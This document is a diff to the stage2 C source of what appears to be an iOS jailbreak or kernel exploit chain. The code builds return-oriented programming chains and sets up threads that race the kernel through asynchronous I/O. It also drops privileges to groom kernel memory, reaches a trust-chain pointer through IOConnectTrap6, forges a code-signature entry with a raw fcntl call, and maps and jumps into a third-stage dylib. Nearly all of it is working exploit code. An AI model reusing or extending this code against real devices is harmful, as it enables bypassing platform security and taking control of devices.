@@ -629,6 +629,9 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	// let's go
 	INIT_FRAMEWORK(offsets);
+
+
+	
 /*	
 	CALL_FUNC(0x0,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
 	CALL_FUNC_WITH_RET_SAVE(0x0,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
@@ -652,7 +655,20 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	snprintf((char*)&buf,sizeof(buf),"testing...");
 	DEFINE_ROP_VAR("test_string",sizeof(buf),buf);
 
-#if 1
+	char * tmp = malloc(0x1000);
+	memset(tmp,0,0x1000);
+
+	// fixup errno (comment that out if you want to debug)
+	// map the memory it uses
+	CALL("__mmap",offsets->errno_offset & ~0x3fff, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0,0,0);
+	// setup a pointer to a zero value to make it skip some code and not crash
+	DEFINE_ROP_VAR("new_errno_addr",8,tmp);
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG("new_errno_addr",2);
+	CALL("memcpy",offsets->errno_offset+8/*FIXME: maybe this is not the same offset on all platforms*/,0,8,0,0,0,0,0);
+
+
+#if 0
 
 	char * dylib_str = malloc(100);
 	snprintf(dylib_str,100,"/usr/sbin/racoon.dylib");
@@ -671,13 +687,13 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_READ|PROT_WRITE,MAP_FIXED|MAP_PRIVATE,0,0,0,0);
 	fsignatures_t * siginfo = malloc(sizeof(fsignatures_t));
 	memset(siginfo,0,sizeof(fsignatures_t));
-	siginfo->fs_blob_start = offsets->stage3_CS_blob;
+	siginfo->fs_blob_start = offsets->stage3_loadaddr + offsets->stage3_CS_blob;
 	siginfo->fs_blob_size = offsets->stage3_CS_blob_size;
 	DEFINE_ROP_VAR("siginfo",sizeof(fsignatures_t),siginfo);
 	ROP_VAR_ARG_HOW_MANY(2);
 	ROP_VAR_ARG64("dylib_fd",1);
 	ROP_VAR_ARG("siginfo",3);
-	CALL("fcntl",0,F_ADDSIGS,0,0,0,0,0,0);
+	CALL_FUNC(offsets->fcntl_raw_syscall,0,F_ADDSIGS,0,0,0,0,0,0);
 	// map it at a fixed address (this will smash the blob)
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG64("dylib_fd",5);
@@ -757,8 +773,6 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	
 	// SETUP VARS
 	// TODO: replace tmp with NULL and let the framework handle it
-	char * tmp = malloc(0x1000);
-	memset(tmp,0,0x1000);
 	DEFINE_ROP_VAR("should_race",sizeof(uint64_t),tmp); //
 	DEFINE_ROP_VAR("msg_port",sizeof(mach_port_t),tmp); // the port which we use to send and recieve the message
 	DEFINE_ROP_VAR("tmp_port",sizeof(mach_port_t),tmp); // the port which has to be in the message which we send to the kernel
@@ -998,30 +1012,12 @@ _STRUCT_ARM_THREAD_STATE64
 	new_thread_state->__pc = offsets->longjmp-0x180000000+offsets->new_cache_addr; /*slide it here*/
 	new_thread_state->__x[0] = offsets->stage2_base+offsets->stage2_max_size+BARRIER_BUFFER_SIZE /*x0 should point to the longjmp buf*/;
 	DEFINE_ROP_VAR("thread_state",sizeof(_STRUCT_ARM_THREAD_STATE64),new_thread_state)
-	/*
 	ROP_VAR_ARG_HOW_MANY(3);
 	ROP_VAR_ARG64("self",1);
 	ROP_VAR_ARG("thread_state",3);
 	ROP_VAR_ARG("racer_kernel_thread",5);
 	CALL("thread_create_running",0,ARM_THREAD_STATE64,0,sizeof(_STRUCT_ARM_THREAD_STATE64)/4,0,0,0,0);
-	*/
-
 	
-	
-	DEFINE_ROP_VAR("racer_kernel_thread2",sizeof(thread_act_t),tmp);
-	_STRUCT_ARM_THREAD_STATE64 * new_thread_state2 = malloc(sizeof(_STRUCT_ARM_THREAD_STATE64));
-	memset(new_thread_state2,0,sizeof(_STRUCT_ARM_THREAD_STATE64));
-	new_thread_state2->__pc = offsets->longjmp-0x180000000+offsets->new_cache_addr; /*slide it here*/
-	new_thread_state2->__x[0] = offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE + offsets->thread_max_size; /*x0 should point to the longjmp buf*/;
-	DEFINE_ROP_VAR("thread_state2",sizeof(_STRUCT_ARM_THREAD_STATE64),new_thread_state2)
-	/*
-	ROP_VAR_ARG_HOW_MANY(3);
-	ROP_VAR_ARG64("self",1);
-	ROP_VAR_ARG("thread_state2",3);
-	ROP_VAR_ARG("racer_kernel_thread2",5);
-	CALL("thread_create_running",0,ARM_THREAD_STATE64,0,sizeof(_STRUCT_ARM_THREAD_STATE64)/4,0,0,0,0);
-	*/
-
 
 	// we need to wait for a short amout of time till the other thread called open
 	// we can't call usleep on it's own so we just run our own implementation
@@ -1032,6 +1028,10 @@ _STRUCT_ARM_THREAD_STATE64
 
 	// TODO: we can prob remove this when we chown the log to mobile or change the permissions
 	ADD_USLEEP(100);
+
+	ADD_LOOP_START("wait");
+		ADD_USLEEP(1000);
+	ADD_LOOP_END();
 
 	CALL("seteuid",501,0,0,0,0,0,0,0); // drop priv to mobile so that we leak refs/get the dicts into kalloc.16
 
@@ -1308,25 +1308,36 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG64("bss_trust_chain_head_ptr",3);
 	CALL("IOConnectTrap6",0,0,0,8,0,0,0,0);
 
-	ADD_LOOP_START("sleep");
-		ADD_USLEEP(100);
-	ADD_LOOP_END();
-
 	// ghetto dlopen
 	// get a file descriptor for that dylib
-	DEFINE_ROP_VAR("dylib_fd",8,tmp);
+	DEFINE_ROP_VAR("dylib_fd",8,&buf);
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("dylib_str",1);
 	CALL_FUNC_RET_SAVE_VAR("dylib_fd",get_addr_from_name(offsets,"open"),0,O_RDONLY,0,0,0,0,0,0);
-	// map it at a fixed address
+	// add codesignature to the vnode
+	// mmap the blob
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG64("dylib_fd",5);
-	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_SHARED,0,offsets->stage3_fileoffset,0,0);
+	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_READ|PROT_WRITE,MAP_FIXED|MAP_PRIVATE,0,0,0,0);
+	fsignatures_t * siginfo = malloc(sizeof(fsignatures_t));
+	memset(siginfo,0,sizeof(fsignatures_t));
+	siginfo->fs_blob_start = offsets->stage3_loadaddr + offsets->stage3_CS_blob;
+	siginfo->fs_blob_size = offsets->stage3_CS_blob_size;
+	DEFINE_ROP_VAR("siginfo",sizeof(fsignatures_t),siginfo);
+	ROP_VAR_ARG_HOW_MANY(2);
+	ROP_VAR_ARG64("dylib_fd",1);
+	ROP_VAR_ARG("siginfo",3);
+	CALL_FUNC(offsets->fcntl_raw_syscall,0,F_ADDSIGS,0,0,0,0,0,0);
+	// map it at a fixed address (this will smash the blob)
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG64("dylib_fd",5);
+	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_PRIVATE,0,offsets->stage3_fileoffset,0,0);
 	// jump
 	CALL_FUNCTION_NO_SLIDE(offsets->BEAST_GADGET,offsets->stage3_jumpaddr,0xdeadbeef,get_addr_from_name(offsets,"write")-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);
 
 
-	// TODO: figure out what the hell is wrong with those two threads below
+
+
 	// SECOND THREAD STACK STARTS HERE
 	ADD_BARRIER(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE);
  
@@ -1369,36 +1380,6 @@ _STRUCT_ARM_THREAD_STATE64
 	DEFINE_ROP_VAR("aios",NENT * sizeof(struct aiocb),tmp);
 	DEFINE_ROP_VAR("aio_buf",NENT,tmp);
 
-	// block all the racing signals and unblock the one we use below
-	for (int i = 0; i < 4; i++){ 
-		DEFINE_ROP_VAR("mysigmask",sizeof(uint64_t),tmp);
-		SET_ROP_VAR64("mysigmask",(1 << (SIGWINCH-1+i)));
-		ROP_VAR_ARG_HOW_MANY(1);
-		ROP_VAR_ARG("mysigmask",2);
-		CALL("__pthread_sigmask",SIG_BLOCK,0,0,0,0,0,0,0);
-	}
-
-	DEFINE_ROP_VAR("signal_set",sizeof(sigset_t),tmp);
-	SET_ROP_VAR64("signal_set",(1 << (SIGWINCH-1)));
-
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("signal_set",2);
-	CALL("__pthread_sigmask",SIG_UNBLOCK,0,NULL,0,0,0,0,0);
-
-	DEFINE_ROP_VAR("sigevent",sizeof(struct sigevent),tmp);
-	SET_ROP_VAR32_W_OFFSET("sigevent",SIGEV_SIGNAL,offsetof(struct sigevent,sigev_notify));
-	SET_ROP_VAR32_W_OFFSET("sigevent",SIGWINCH,offsetof(struct sigevent,sigev_signo));
-
-	struct __sigaction * myaction = malloc(sizeof(struct __sigaction));
-	memset(myaction,0,sizeof(struct __sigaction));
-	myaction->sa_handler = (void (*)(int)) offsets->rop_nop-0x180000000+offsets->new_cache_addr;
-	myaction->sa_tramp = (void (*)(void *, int, int, siginfo_t *, void *)) get_addr_from_name(offsets,"_sigtramp")-0x180000000+offsets->new_cache_addr;
-	myaction->sa_mask = (1 << (SIGWINCH-1));
-	DEFINE_ROP_VAR("my_action",sizeof(struct __sigaction),myaction);
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("my_action",2);
-	CALL("__sigaction",SIGWINCH,0,0,0,0,0,0,0);
-
 	for (uint32_t i = 0; i < NENT; i++) {
 		int offset = sizeof(struct aiocb) * i;
 		ROP_VAR_CPY_W_OFFSET("aios",offset + offsetof(struct aiocb,aio_fildes),"racer_fd",0,4);
@@ -1411,22 +1392,11 @@ _STRUCT_ARM_THREAD_STATE64
 		SET_ROP_VAR64_TO_VAR_W_OFFSET("aio_list",i*8,"aios",offset);
 	}
 
-	// TODO: optimize this (we don't need the aio_return value do we)
 	ADD_LOOP_START("racer_loop");
 		for (int i = 0; i<64;i++) {
-			ROP_VAR_ARG_HOW_MANY(2);
-			ROP_VAR_ARG("aio_list",2);
-			ROP_VAR_ARG("sigevent",4);
-			CALL("lio_listio",LIO_NOWAIT,0,NENT,0,0,0,0,0);
-		}
-		ROP_VAR_ARG_HOW_MANY(1);
-		ROP_VAR_ARG64("reply_port",5); 
-		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_RCV_TIMEOUT,0,0,0 /*recv port*/, 1, MACH_PORT_NULL,0);
-		
-		for (int i = 0; i < NENT; i++) {
 			ROP_VAR_ARG_HOW_MANY(1);
-			ROP_VAR_ARG64_W_OFFSET("aio_list",1,i*8);
-			CALL("aio_return",0,0,0,0,0,0,0,0);
+			ROP_VAR_ARG("aio_list",2);
+			CALL("lio_listio",LIO_NOWAIT,0,NENT,0,0,0,0,0);
 		}
 
 		// set x0 
@@ -1439,115 +1409,6 @@ _STRUCT_ARM_THREAD_STATE64
 	ADD_LOOP_START("endless_thread_loop");
 		ADD_USLEEP(10000000);
 	ADD_LOOP_END();
-
-	// THREAD 3 starts here
-	ADD_BARRIER(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE + offsets->thread_max_size);
- 
-
-	// longjmp buf, pivoting everything
-	ADD_GADGET(); /* x19 */
-    ADD_GADGET(); /* x20 */
-    ADD_GADGET(); /* x21 */
-    ADD_GADGET(); /* x22 */
-    ADD_GADGET(); /* x23 */
-    ADD_GADGET(); /* x24 */
-    ADD_GADGET(); /* x25 */
-    ADD_GADGET(); /* x26 */
-    ADD_GADGET(); /* x27 */
-    ADD_GADGET(); /* x28 */
-    ADD_GADGET(); /* x29 */
-    ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 */ 
-    ADD_GADGET(); /* x29 */ 
-    ADD_STATIC_GADGET(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE + offsets->thread_max_size+ 22*8 /*jump over that longjmp buffer here*/); /* x2 */ 
-    ADD_GADGET(); /* D8 */
-    ADD_GADGET(); /* D9 */
-    ADD_GADGET(); /* D10 */
-    ADD_GADGET(); /* D11 */
-    ADD_GADGET(); /* D12 */
-    ADD_GADGET(); /* D13 */
-    ADD_GADGET(); /* D14 */
-    ADD_GADGET(); /* D15 */
-
-	//  int fd = open(path, O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
-	DEFINE_ROP_VAR("racer_fd2",sizeof(uint64_t),tmp);
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("racer_path",1);
-	CALL_FUNC_RET_SAVE_VAR("racer_fd2",get_addr_from_name(offsets,"open"),0,O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO,0,0,0,0,0);
-
-	DEFINE_ROP_VAR("aio_list2",NENT * 8,tmp);
-	DEFINE_ROP_VAR("aios2",NENT * sizeof(struct aiocb),tmp);
-
-	// block the signals the other racing threads use (we just block all and then unblock below)
-	DEFINE_ROP_VAR("mysigmask3",sizeof(uint64_t),tmp);
-	for (int i = 0; i < 4; i++) { 
-		SET_ROP_VAR64("mysigmask3",(1 << (SIGWINCH-1+i)));
-		ROP_VAR_ARG_HOW_MANY(1);
-		ROP_VAR_ARG("mysigmask3",2);
-		CALL("__pthread_sigmask",SIG_BLOCK,0,0,0,0,0,0,0);
-	}
-
-	DEFINE_ROP_VAR("signal_set2",sizeof(sigset_t),tmp);
-	SET_ROP_VAR64("signal_set2",(1 << (SIGWINCH-1+1)));
-
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("signal_set2",2);
-	CALL("__pthread_sigmask",SIG_UNBLOCK,0,NULL,0,0,0,0,0);
-
-	DEFINE_ROP_VAR("sigevent2",sizeof(struct sigevent),tmp);
-	SET_ROP_VAR32_W_OFFSET("sigevent2",SIGEV_SIGNAL,offsetof(struct sigevent,sigev_notify));
-	SET_ROP_VAR32_W_OFFSET("sigevent2",SIGWINCH+1,offsetof(struct sigevent,sigev_signo));
-
-	struct __sigaction * myaction2 = malloc(sizeof(struct __sigaction));
-	memset(myaction2,0,sizeof(struct __sigaction));
-	myaction2->sa_handler = (void (*)(int)) offsets->rop_nop-0x180000000+offsets->new_cache_addr;
-	myaction2->sa_tramp = (void (*)(void *, int, int, siginfo_t *, void *)) get_addr_from_name(offsets,"_sigtramp")-0x180000000+offsets->new_cache_addr;
-	myaction2->sa_mask = (1 << (SIGWINCH-1+1));
-	DEFINE_ROP_VAR("my_action2",sizeof(struct __sigaction),myaction2);
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("my_action2",2);
-	CALL("__sigaction",SIGWINCH+1,0,0,0,0,0,0,0);
-
-	for (uint32_t i = 0; i < NENT; i++) {
-		int offset = sizeof(struct aiocb) * i;
-		ROP_VAR_CPY_W_OFFSET("aios",offset + offsetof(struct aiocb,aio_fildes),"racer_fd2",0,4);
-		SET_ROP_VAR64_W_OFFSET("aios2",0,offset + offsetof(struct aiocb,aio_offset)); 
-		SET_ROP_VAR64_TO_VAR_W_OFFSET("aios2",offset+offsetof(struct aiocb,aio_buf),"aio_buf",i);
-		SET_ROP_VAR64_W_OFFSET("aios2",1,offset + offsetof(struct aiocb,aio_nbytes));
-		SET_ROP_VAR32_W_OFFSET("aios2",LIO_READ,offset + offsetof(struct aiocb,aio_lio_opcode)); 
-		SET_ROP_VAR32_W_OFFSET("aios2",SIGEV_NONE,offset + offsetof(struct aiocb,aio_sigevent.sigev_notify));
-
-		SET_ROP_VAR64_TO_VAR_W_OFFSET("aio_list2",i*8,"aios2",offset);
-	}
-
-	// TODO: optimize this (we don't need the aio_return value do we)
-	ADD_LOOP_START("racer_loop2");
-		for (int i = 0; i<64;i++) {
-			ROP_VAR_ARG_HOW_MANY(2);
-			ROP_VAR_ARG("aio_list2",2);
-			ROP_VAR_ARG("sigevent2",4);
-			CALL("lio_listio",LIO_NOWAIT,0,NENT,0,0,0,0,0);
-		}
-		ROP_VAR_ARG_HOW_MANY(1);
-		ROP_VAR_ARG64("reply_port",5); 
-		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_RCV_TIMEOUT,0,0,0 /*recv port*/, 1, MACH_PORT_NULL,0);
-		
-		for (int i = 0; i < NENT; i++) {
-			ROP_VAR_ARG_HOW_MANY(1);
-			ROP_VAR_ARG64_W_OFFSET("aio_list2",1,i*8);
-			CALL("aio_return",0,0,0,0,0,0,0,0);
-		}
-
-		// set x0 
-		SET_X0_FROM_ROP_VAR("should_race");
-		// break out of the loop if x0 is nonzero
-		ADD_LOOP_BREAK_IF_X0_NONZERO("racer_loop2");
-	ADD_LOOP_END();
-	
-	// this thread wasn't spawned using pthread so we can't easily exit...
-	ADD_LOOP_START("endless_thread_loop");
-		ADD_USLEEP(10000000);
-	ADD_LOOP_END();
-
 #endif
 
 	if (curr_rop_var != NULL) {
